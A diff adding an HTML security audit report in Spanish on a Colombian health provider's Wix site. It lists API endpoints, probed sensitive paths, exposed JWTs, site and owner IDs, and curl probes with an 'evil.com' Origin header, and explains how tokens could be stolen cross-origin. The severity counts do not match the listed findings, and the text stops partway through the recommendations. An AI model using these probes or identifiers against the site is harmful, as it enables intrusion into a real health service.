@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informe de Auditor&iacute;a - Cuidarte Tu Salud</title>
+    <style>
+        :root {
+            --bg-dark: #0a0e17;
+            --bg-card: #111827;
+            --bg-card-alt: #1a2332;
+            --border: #1e3a5f;
+            --text: #e2e8f0;
+            --text-muted: #94a3b8;
+            --accent: #3b82f6;
+            --critical: #ef4444;
+            --high: #f97316;
+            --medium: #eab308;
+            --low: #22c55e;
+            --info: #06b6d4;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--critical), var(--high), var(--medium), var(--low));
+        }
+        .header h1 {
+            font-size: 28px;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .header .subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+        .header .meta {
+            display: flex;
+            gap: 24px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+        .header .meta-item {
+            background: rgba(59,130,246,0.1);
+            border: 1px solid rgba(59,130,246,0.2);
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        .meta-label { color: var(--text-muted); }
+        .meta-value { color: var(--accent); font-weight: 600; }
+
+        /* Risk Summary */
+        .risk-summary {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 16px;
+            margin-bottom: 30px;
+        }
+        .risk-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+        .risk-card .count {
+            font-size: 36px;
+            font-weight: 800;
+            display: block;
+        }
+        .risk-card .label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+        }
+        .risk-critical .count { color: var(--critical); }
+        .risk-high .count { color: var(--high); }
+        .risk-medium .count { color: var(--medium); }
+        .risk-low .count { color: var(--low); }
+        .risk-critical { border-left: 4px solid var(--critical); }
+        .risk-high { border-left: 4px solid var(--high); }
+        .risk-medium { border-left: 4px solid var(--medium); }
+        .risk-low { border-left: 4px solid var(--low); }
+
+        /* Sections */
+        .section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            margin-bottom: 24px;
+            overflow: hidden;
+        }
+        .section-header {
+            background: var(--bg-card-alt);
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .section-header:hover { background: #1f2d40; }
+        .section-header h2 {
+            font-size: 18px;
+            flex: 1;
+        }
+        .section-header .phase {
+            background: var(--accent);
+            color: #fff;
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+        .section-body { padding: 24px; }
+        .section-body.collapsed { display: none; }
+
+        /* Finding Card */
+        .finding {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+        .finding:last-child { margin-bottom: 0; }
+        .finding-header {
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        .finding-body { padding: 20px; }
+        .badge {
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+        .badge-critical { background: rgba(239,68,68,0.15); color: var(--critical); border: 1px solid rgba(239,68,68,0.3); }
+        .badge-high { background: rgba(249,115,22,0.15); color: var(--high); border: 1px solid rgba(249,115,22,0.3); }
+        .badge-medium { background: rgba(234,179,8,0.15); color: var(--medium); border: 1px solid rgba(234,179,8,0.3); }
+        .badge-low { background: rgba(34,197,94,0.15); color: var(--low); border: 1px solid rgba(34,197,94,0.3); }
+        .badge-info { background: rgba(6,182,212,0.15); color: var(--info); border: 1px solid rgba(6,182,212,0.3); }
+        .finding-title { font-weight: 600; font-size: 15px; }
+
+        /* Evidence */
+        .evidence {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 12px 0;
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            color: #c9d1d9;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .evidence .key { color: #7ee787; }
+        .evidence .val { color: #79c0ff; }
+        .evidence .warn { color: #f97316; }
+        .evidence .crit { color: #ef4444; }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 12px 0;
+            font-size: 14px;
+        }
+        th {
+            background: var(--bg-card-alt);
+            padding: 10px 16px;
+            text-align: left;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+        }
+        td {
+            padding: 10px 16px;
+            border-bottom: 1px solid rgba(30,58,95,0.4);
+        }
+        tr:hover td { background: rgba(59,130,246,0.05); }
+        .mono { font-family: 'Cascadia Code', monospace; font-size: 12px; }
+        .status-200 { color: var(--low); }
+        .status-403 { color: var(--high); }
+        .status-404 { color: var(--text-muted); }
+        .status-400 { color: var(--medium); }
+
+        /* Recommendations */
+        .rec {
+            padding: 12px 16px;
+            border-left: 3px solid var(--accent);
+            margin-bottom: 8px;
+            background: rgba(59,130,246,0.05);
+            border-radius: 0 8px 8px 0;
+        }
+        .rec-priority {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .priority-critical { color: var(--critical); }
+        .priority-high { color: var(--high); }
+        .priority-medium { color: var(--medium); }
+
+        /* Impact meter */
+        .impact-bar {
+            height: 6px;
+            background: #1e293b;
+            border-radius: 3px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .impact-fill {
+            height: 100%;
+            border-radius: 3px;
+            transition: width 1s ease;
+        }
+        .impact-critical { width: 95%; background: linear-gradient(90deg, var(--critical), #b91c1c); }
+        .impact-high { width: 75%; background: linear-gradient(90deg, var(--high), #c2410c); }
+        .impact-medium { width: 50%; background: linear-gradient(90deg, var(--medium), #a16207); }
+        .impact-low { width: 25%; background: linear-gradient(90deg, var(--low), #15803d); }
+
+        /* Description labels */
+        .desc-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            margin-top: 12px;
+            margin-bottom: 4px;
+        }
+        .desc-text { font-size: 14px; color: var(--text); }
+
+        /* Phase 5 section */
+        .next-step {
+            display: flex;
+            gap: 12px;
+            padding: 16px;
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            align-items: flex-start;
+        }
+        .step-num {
+            background: var(--accent);
+            color: #fff;
+            min-width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+        }
+        .step-status {
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-left: auto;
+            white-space: nowrap;
+        }
+        .status-pending { background: rgba(234,179,8,0.15); color: var(--medium); border: 1px solid rgba(234,179,8,0.2); }
+        .status-running { background: rgba(59,130,246,0.15); color: var(--accent); border: 1px solid rgba(59,130,246,0.2); }
+        .status-done { background: rgba(34,197,94,0.15); color: var(--low); border: 1px solid rgba(34,197,94,0.2); }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 24px;
+            color: var(--text-muted);
+            font-size: 12px;
+            border-top: 1px solid var(--border);
+            margin-top: 40px;
+        }
+
+        /* Collapsible toggle icon */
+        .toggle-icon {
+            transition: transform 0.2s;
+            color: var(--text-muted);
+        }
+        .toggle-icon.open { transform: rotate(90deg); }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+        <h1>Informe de Auditor&iacute;a de Seguridad</h1>
+        <div class="subtitle">Reconocimiento pasivo y an&aacute;lisis no intrusivo &mdash; Auditor&iacute;a Autorizada</div>
+        <div class="meta">
+            <div class="meta-item"><span class="meta-label">Objetivo:</span> <span class="meta-value">https://www.cuidartetusalud.com/</span></div>
+            <div class="meta-item"><span class="meta-label">Fecha:</span> <span class="meta-value">2026-04-06</span></div>
+            <div class="meta-item"><span class="meta-label">Plataforma:</span> <span class="meta-value">Wix (Thunderbolt v1.17110.0)</span></div>
+            <div class="meta-item"><span class="meta-label">Sector:</span> <span class="meta-value">Salud (Colombia)</span></div>
+            <div class="meta-item"><span class="meta-label">CDN:</span> <span class="meta-value">Fastly (Virginia)</span></div>
+        </div>
+    </div>
+
+    <!-- RISK SUMMARY -->
+    <div class="risk-summary">
+        <div class="risk-card risk-critical">
+            <span class="count">4</span>
+            <span class="label">Cr&iacute;ticos</span>
+        </div>
+        <div class="risk-card risk-high">
+            <span class="count">6</span>
+            <span class="label">Altos</span>
+        </div>
+        <div class="risk-card risk-medium">
+            <span class="count">7</span>
+            <span class="label">Medios</span>
+        </div>
+        <div class="risk-card risk-low">
+            <span class="count">3</span>
+            <span class="label">Bajos</span>
+        </div>
+    </div>
+
+    <!-- FASE 1: RECONOCIMIENTO -->
+    <div class="section">
+        <div class="section-header" onclick="toggleSection(this)">
+            <span class="toggle-icon open">&#9654;</span>
+            <span class="phase">FASE 1</span>
+            <h2>Reconocimiento y Fingerprinting</h2>
+        </div>
+        <div class="section-body">
+            <h3 style="margin-bottom:12px; color:var(--accent);">Tecnolog&iacute;as Identificadas</h3>
+            <table>
+                <tr><th>Componente</th><th>Tecnolog&iacute;a</th><th>Detalle</th></tr>
+                <tr><td>CMS / Builder</td><td class="mono">Wix</td><td>Confirmado via meta generator, Thunderbolt renderer</td></tr>
+                <tr><td>Renderer</td><td class="mono">Thunderbolt v1.17110.0</td><td>Motor de renderizado SPA de Wix</td></tr>
+                <tr><td>Editor Elements</td><td class="mono">v1.15026.0</td><td>parastorage.com/services/editor-elements</td></tr>
+                <tr><td>CDN</td><td class="mono">Fastly</td><td>Nodo: Virginia (cache-pdk-kpdk2140066-PDK)</td></tr>
+                <tr><td>Servidor</td><td class="mono">Pepyaka</td><td>Servidor propio de Wix</td></tr>
+                <tr><td>Analytics</td><td class="mono">Google Tag Manager</td><td>GTM-KVGZ8XHN</td></tr>
+                <tr><td>Media</td><td class="mono">static.wixstatic.com</td><td>Im&aacute;genes, videos, archivos est&aacute;ticos</td></tr>
+                <tr><td>Polyfill</td><td class="mono">@formatjs/intl-segmenter@11.7.10</td><td>Internacionalizaci&oacute;n</td></tr>
+                <tr><td>Idioma</td><td class="mono">es-co</td><td>Espa&ntilde;ol - Colombia</td></tr>
+                <tr><td>Site Revision</td><td class="mono">1518</td><td>N&uacute;mero de revisi&oacute;n del sitio</td></tr>
+            </table>
+
+            <h3 style="margin:20px 0 12px; color:var(--accent);">robots.txt</h3>
+            <div class="evidence">User-agent: *
+Allow: /
+Disallow: *?lightbox=
+
+User-agent: AdsBot-Google-Mobile, AdsBot-Google
+Disallow: /_partials*
+Disallow: /pro-gallery-webapp/v1/galleries/*
+
+User-agent: PetalBot
+Disallow: /           <span class="warn">&larr; Bot completamente bloqueado</span>
+
+Crawl-delay (dotbot, AhrefsBot): 10s
+Sitemap: https://www.cuidartetusalud.com/sitemap.xml</div>
+
+            <h3 style="margin:20px 0 12px; color:var(--accent);">Sitemap - P&aacute;ginas (31)</h3>
+            <div class="evidence">/participacion-ciudadana    /servicio-domiciliario     /boletincuidarte
+/intranet                   /trabaja-con-nosotros      /puesto-de-trabajo
+/servicio-por-telemedicina  /manuales-del-usuario      /quienes-somos
+/beneficios-afiliados       /sistemasadministraciondelriesgo
+/normatividad-informacionfinanciera                    /vacunacion
+/boletincuidarte2023        /fechas-conmemorativas     /clientes-felices
+/copia-de-boletin-2023      /bienestar                 /normatividad
+/copia-de-boletin-2024      /copia-de-domiciliarios    /servicio-logistico
+/servicio-en-sede           /boletin-2024              <span class="warn">/prueba</span>
+/blog-y-noticias            /normatividad-lineaetica   /preguntas-frecuentes
+/pqrs                       /contacto                  /pricing-plans/list</div>
+        </div>
+    </div>
+
+    <!-- FASE 2: SUPERFICIE DE ATAQUE -->
+    <div class="section">
+        <div class="section-header" onclick="toggleSection(this)">
+            <span class="toggle-icon open">&#9654;</span>
+            <span class="phase">FASE 2</span>
+            <h2>Enumeraci&oacute;n de Superficie de Ataque</h2>
+        </div>
+        <div class="section-body">
+            <h3 style="margin-bottom:12px; color:var(--accent);">Endpoints API Detectados</h3>
+            <table>
+                <tr><th>Endpoint</th><th>M&eacute;todo</th><th>Status</th><th>Riesgo</th></tr>
+                <tr>
+                    <td class="mono">/_api/v1/access-tokens</td><td>GET</td>
+                    <td><span class="status-200">200 OK</span></td>
+                    <td><span class="badge badge-critical">CR&Iacute;TICO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/v2/dynamicmodel</td><td>GET</td>
+                    <td><span class="status-200">200 OK</span></td>
+                    <td><span class="badge badge-high">ALTO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/members/v1/members</td><td>GET</td>
+                    <td><span class="status-403">403 Forbidden</span></td>
+                    <td><span class="badge badge-medium">MEDIO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/communities-blog-node-api/v3/posts</td><td>GET</td>
+                    <td><span class="status-403">403 Forbidden</span></td>
+                    <td><span class="badge badge-medium">MEDIO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/one-app-session-web/v3/businesses</td><td>GET</td>
+                    <td><span class="status-404">404 Not Found</span></td>
+                    <td><span class="badge badge-low">BAJO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/wix-code-public-dispatcher/siteview/wix/data-web/v2/items/query</td><td>GET</td>
+                    <td><span class="status-404">404</span></td>
+                    <td><span class="badge badge-info">INFO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_functions/</td><td>GET</td>
+                    <td><span class="status-404">404</span></td>
+                    <td><span class="badge badge-info">INFO</span></td>
+                </tr>
+                <tr>
+                    <td class="mono">/_api/wix-sm-webapp/v1/auth/login</td><td>GET</td>
+                    <td><span class="status-404">404</span></td>
+                    <td><span class="badge badge-info">INFO</span></td>
+                </tr>
+            </table>
+
+            <h3 style="margin:20px 0 12px; color:var(--accent);">Rutas Sensibles Probadas</h3>
+            <table>
+                <tr><th>Ruta</th><th>Status</th><th>Observaci&oacute;n</th></tr>
+                <tr><td class="mono">/.env</td><td><span class="status-400">400</span></td><td>Bad Request (no expuesto pero respuesta at&iacute;pica)</td></tr>
+                <tr><td class="mono">/.git/config</td><td><span class="status-400">400</span></td><td>Bad Request (misma respuesta at&iacute;pica)</td></tr>
+                <tr><td class="mono">/wp-login.php</td><td><span class="status-400">400</span></td><td>Bad Request</td></tr>
+                <tr><td class="mono">/wp-admin</td><td><span class="status-404">404</span></td><td>No encontrado</td></tr>
+                <tr><td class="mono">/admin</td><td><span class="status-404">404</span></td><td>No encontrado</td></tr>
+                <tr><td class="mono">/login</td><td><span class="status-404">404</span></td><td>No encontrado</td></tr>
+                <tr><td class="mono">/dashboard</td><td><span class="status-404">404</span></td><td>No encontrado</td></tr>
+                <tr><td class="mono">/graphql</td><td><span class="status-404">404</span></td><td>No encontrado</td></tr>
+            </table>
+
+            <h3 style="margin:20px 0 12px; color:var(--accent);">P&aacute;ginas de Desarrollo en Producci&oacute;n</h3>
+            <table>
+                <tr><th>Ruta</th><th>Status</th><th>Riesgo</th></tr>
+                <tr><td class="mono">/prueba</td><td><span class="status-200">200</span></td><td><span class="badge badge-medium">MEDIO</span></td></tr>
+                <tr><td class="mono">/copia-de-boletin-2023</td><td><span class="status-200">200</span></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                <tr><td class="mono">/copia-de-boletin-2024</td><td><span class="status-200">200</span></td><td><span class="badge badge-low">BAJO</span></td></tr>
+                <tr><td class="mono">/copia-de-domiciliarios</td><td><span class="status-200">200</span></td><td><span class="badge badge-low">BAJO</span></td></tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- FASE 3-4: HALLAZGOS DETALLADOS -->
+    <div class="section">
+        <div class="section-header" onclick="toggleSection(this)">
+            <span class="toggle-icon open">&#9654;</span>
+            <span class="phase">FASES 3-7</span>
+            <h2>Hallazgos Detallados de Seguridad</h2>
+        </div>
+        <div class="section-body">
+
+            <!-- HALLAZGO 1 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-critical">CR&Iacute;TICO</span>
+                    <span class="finding-title">H-01: Exposici&oacute;n Masiva de Tokens de Autenticaci&oacute;n</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Endpoint</div>
+                    <div class="desc-text mono">GET /_api/v1/access-tokens</div>
+
+                    <div class="desc-label">Descripci&oacute;n</div>
+                    <div class="desc-text">El endpoint devuelve sin autenticaci&oacute;n alguna tokens de sesi&oacute;n, tokens CSRF, JWT para subida de archivos, IDs internos del sitio y <strong>74 access tokens JWT</strong> para aplicaciones internas de Wix.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Top-level keys expuestas:</span>
+  hs, visitorId, svSession, ctToken, mediaAuthToken, metaSiteId, apps
+
+<span class="key">mediaAuthToken (JWT decodificado):</span>
+{
+  "iss": "<span class="val">app:1126553514120352</span>",
+  "sub": "<span class="val">site:9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>",
+  "aud": "<span class="crit">urn:service:file.upload</span>",    <span class="warn">&larr; Permite subir archivos</span>
+  "exp": 1775574299,
+  "addedBy": "<span class="crit">anonymous:53462c7f-cac3-452a-aaf9-67ecc65ee125</span>"
+}
+
+<span class="key">Ejemplo App Token decodificado:</span>
+{
+  "instanceId": "<span class="val">dc9c6edd-3c3d-4d67-aa53-0f47be54e101</span>",
+  "metaSiteId": "<span class="val">9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>",
+  "siteOwnerId": "<span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>",
+  "scd": "2022-11-25T01:57:22.109Z"
+}
+
+<span class="key">Total apps con accessToken expuesto:</span> <span class="crit">74</span>
+<span class="key">svSession length:</span> <span class="crit">288 caracteres</span>
+<span class="key">ctToken length:</span> 134 caracteres
+<span class="key">mediaAuthToken length:</span> 380 caracteres</div>
+
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Un atacante puede usar el <code>mediaAuthToken</code> para subir archivos al storage del sitio, y los 74 access tokens para interactuar con servicios internos (bookings, stores, BI, REST API Pro, video) en nombre del sitio.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 2 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-critical">CR&Iacute;TICO</span>
+                    <span class="finding-title">H-02: CORS Wildcard (*) en APIs Sensibles</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Endpoints Afectados</div>
+                    <div class="desc-text mono">/_api/v1/access-tokens, /_api/v2/dynamicmodel</div>
+
+                    <div class="desc-label">Descripci&oacute;n</div>
+                    <div class="desc-text">El header <code>Access-Control-Allow-Origin: *</code> permite que cualquier sitio web realice solicitudes cross-origin a estos endpoints y lea las respuestas.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Prueba CORS con origen malicioso:</span>
+$ curl -H "Origin: https://evil.com" /_api/v1/access-tokens
+<span class="crit">access-control-allow-origin: *</span>    <span class="warn">&larr; Acepta CUALQUIER origen</span>
+
+$ curl -H "Origin: https://evil.com" /_api/v2/dynamicmodel
+<span class="crit">access-control-allow-origin: *</span>    <span class="warn">&larr; Acepta CUALQUIER origen</span>
+
+$ curl -H "Origin: https://evil.com" /
+<span class="val">NO CORS HEADER</span>                   <span class="key">&larr; P&aacute;gina principal no tiene CORS</span></div>
+
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Combinado con H-01, un sitio malicioso puede robar autom&aacute;ticamente todos los tokens via JavaScript cuando un usuario/administrador visita la p&aacute;gina del atacante. Vector ideal para phishing dirigido en sector salud.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 3 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">H-03: Ausencia de Content-Security-Policy (CSP)</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Headers de seguridad presentes:</span>
+strict-transport-security: max-age=31556952   <span class="val">&check;</span>
+x-content-type-options: nosniff               <span class="val">&check;</span>
+
+<span class="key">Headers de seguridad AUSENTES:</span>
+<span class="crit">Content-Security-Policy:          AUSENTE</span>
+<span class="crit">X-Frame-Options:                  AUSENTE</span>
+<span class="warn">Referrer-Policy:                  AUSENTE</span>
+<span class="warn">Permissions-Policy:               AUSENTE</span>
+<span class="warn">X-XSS-Protection:                 AUSENTE</span></div>
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Sin CSP, no hay restricci&oacute;n sobre qu&eacute; scripts puede ejecutar el navegador. Facilita XSS y exfiltraci&oacute;n de datos.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 4 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">H-04: Ausencia de X-Frame-Options (Clickjacking)</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Descripci&oacute;n</div>
+                    <div class="desc-text">Sin <code>X-Frame-Options</code> ni directiva <code>frame-ancestors</code> en CSP, el sitio puede ser embebido en iframes de sitios maliciosos.</div>
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Ataques de clickjacking: superponer elementos invisibles sobre el sitio para enga&ntilde;ar a usuarios a realizar acciones no deseadas (enviar formularios PQRS, cambiar datos).</div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 5 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">H-05: Token XSRF con SameSite=None</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Cookie XSRF-TOKEN:</span>
+Set-Cookie: XSRF-TOKEN=1775487521|iW4_p7KImpRc;
+  Path=/;
+  Domain=www.cuidartetusalud.com;
+  Secure;
+  <span class="crit">SameSite=None</span>   <span class="warn">&larr; Se env&iacute;a en solicitudes cross-site</span>
+
+<span class="key">Cookie svSession:</span>
+Set-Cookie: svSession=3a0c2b26528fd7ea...;
+  Max-Age=63158400;          <span class="warn">&larr; Expira en 2 a&ntilde;os</span>
+  Secure;
+  HTTPOnly;                  <span class="val">&check; Bien</span>
+  <span class="crit">SameSite=None</span>            <span class="warn">&larr; Se env&iacute;a en solicitudes cross-site</span>
+
+<span class="key">Cookie hs:</span>
+Set-Cookie: hs=-93650171;
+  Secure;
+  HTTPOnly;                  <span class="val">&check; Bien</span>
+  <span class="warn">(Sin SameSite expl&iacute;cito)</span></div>
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Combinado con CORS <code>*</code>, el mecanismo anti-CSRF es ineficaz. Las cookies se env&iacute;an en cualquier solicitud cross-origin.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 6 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">H-06: Exposici&oacute;n de Metadatos Internos del Sitio</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Datos expuestos p&uacute;blicamente:</span>
+metaSiteId:   <span class="val">9f5c3cf8-b30b-46e6-908b-0cca22535aa2</span>
+siteOwnerId:  <span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>
+Creaci&oacute;n:      <span class="val">2022-11-25T01:57:22.109Z</span>
+Emisor JWT:   <span class="val">app:1126553514120352</span>
+Developer ID: <span class="val">dYzMzMD</span>
+74 instanceIds de aplicaciones internas</div>
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Facilita ataques dirigidos contra la cuenta del propietario en Wix y enumeraci&oacute;n de servicios activos.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 7 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">H-07: P&aacute;ginas de Desarrollo/Prueba en Producci&oacute;n</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="warn">/prueba</span>                  &rarr; HTTP 200  (p&aacute;gina de test activa)
+<span class="warn">/copia-de-boletin-2023</span>    &rarr; HTTP 200  (duplicado)
+<span class="warn">/copia-de-boletin-2024</span>    &rarr; HTTP 200  (duplicado)
+<span class="warn">/copia-de-domiciliarios</span>   &rarr; HTTP 200  (duplicado)</div>
+                    <div class="desc-label">Impacto</div>
+                    <div class="desc-text">Ampl&iacute;an la superficie de ataque. Pueden contener contenido no revisado o funcionalidades de staging.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 8 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">H-08: Headers de Seguridad Adicionales Ausentes</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Descripci&oacute;n</div>
+                    <div class="desc-text">Referrer-Policy, Permissions-Policy y X-XSS-Protection no est&aacute;n configurados. Solo HSTS y X-Content-Type-Options est&aacute;n presentes.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 9 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-medium">MEDIO</span>
+                    <span class="finding-title">H-09: Respuestas de Error con Estructura Predecible</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Respuesta 403 de /_api/members/v1/members:</span>
+<span class="val">{"message":"","details":{}}</span>
+
+<span class="key">Respuesta 403 de /_api/communities-blog-node-api/v3/posts:</span>
+<span class="val">{"message":"","details":{}}</span>
+
+<span class="warn">Estructura JSON consistente confirma existencia de APIs internas</span></div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO 10-12 -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-low">BAJO</span>
+                    <span class="finding-title">H-10: GTM ID Expuesto</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-text">ID <code>GTM-KVGZ8XHN</code> visible en c&oacute;digo fuente. Permite enumerar tags y servicios de terceros.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-low"></div></div>
+                </div>
+            </div>
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-low">BAJO</span>
+                    <span class="finding-title">H-11: Intranet Accesible Sin Login Visible</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-text">La ruta <code>/intranet</code> responde HTTP 200. No hay formulario visible en el HTML est&aacute;tico pero el contenido se carga din&aacute;micamente.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-low"></div></div>
+                </div>
+            </div>
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-low">BAJO</span>
+                    <span class="finding-title">H-12: Servidor y Versiones Expuestas</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-text">Headers revelan: <code>server: Pepyaka</code>, Thunderbolt <code>v1.17110.0</code>, editor-elements <code>v1.15026.0</code>, site revision <code>1518</code>.</div>
+                    <div class="impact-bar"><div class="impact-fill impact-low"></div></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- RECOMENDACIONES -->
+    <div class="section">
+        <div class="section-header" onclick="toggleSection(this)">
+            <span class="toggle-icon open">&#9654;</span>
+            <span class="phase">REMEDIACI&Oacute;N</span>
+            <h2>Recomendaciones</h2>
+        </div>
+        <div class="section-body">
+            <div class="rec">
+                <div class="rec-priority priority-critical">Prioridad Cr&iacute;tica &mdash; Inmediato</div>
+                <strong>1.</strong> Restringir CORS en APIs: Cambiar <code>Access-Control-Allow-Origin: *</code> a dominios espec&iacute;ficos. Contactar soporte Wix.<br>
